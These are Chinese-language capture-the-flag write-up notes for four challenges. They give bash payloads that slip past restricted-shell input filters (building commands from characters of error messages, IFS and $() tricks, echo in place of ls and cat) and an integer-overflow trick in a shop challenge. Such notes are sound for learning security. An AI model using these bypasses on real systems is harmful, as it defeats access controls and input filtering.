SansAlpha:
	描述:服务器不准输入字母甚至反斜杠,只能输入数字及其他符号,ssh连上后如何获得flag
	思路:尝试各种命令,显示报错,根据报错的信息内容,保存报错内容,提取字符组成命令,ls,cat,然后执行
	1.输入: "$(./1 2>&1)"
		命令./会导致报错: bash: ./1: No such file or directory
		2>&1 表示将错误定向到标准输出
		"" 表示将其中内容当做参数内容保存到 $_,方便后面提取
	2.组命令 ls : ${_:21:1}${_:2:1}
		${_:21:1}  为 bash: ./1: No such file or directory 第21偏移的'l'字符
		${_:2:1}  为 bash: ./1: No such file or directory 第2偏移的's'字符
	3.当前目录,没找到,继续寻找子目录		#每次都要先执行一下 "$(./1 2>&1)"
		${_:21:1}${_:2:1} */		# ls */ 	#遍历及子目录
	4.找到flag.txt文件,组cat查看,拿到flag
		${_:16:1}${_:1:1}${_:32:1} */${_:19:1}*		#cat */f*

specialer:
	描述:服务器限制了命令,如ls,cat,如何找出flag
	思路:使用echo ,cd 命令
	1.输入 echo *		#代替 ls 查看当前目录内容
	2.cd xx			#cd到xx目录
	3.输入 echo $(<xxx.txt)		#查看该目录下 xxx.txt文件得内容
special:
	描述:服务器会讲输入首字母大写,从而无法执行命令
	思路:使用命令替换$()
	1.输入 $(ls)	#会显示目录下第一个文件名(blargh)无法执行的报错信息
	2.输入 $(ls blargh)		#有空格,报错了
	3.输入 $(IFS=];b=ls]blargh;$b)	#绕过空格,用]代替空格	 报错信息中显示flag.txt文件名称
	4.$(IFS=];b=cat]blargh/flag.txt;$b)	#显示flag内容

flag_shop:
	描述:商店有真flag,售价100000$, 假flag售价900$,手里有1100$
	思路:通过购买假flag,当购买数量足够大,超过服务器该字段的最大数字(2^31),就会生成负数补码
	1.计算 ((2^31 + 100000)/900)+1		#这个就是购买数量,购买后,剩余存款超过100000$
	2.然后就可以购买真的flag
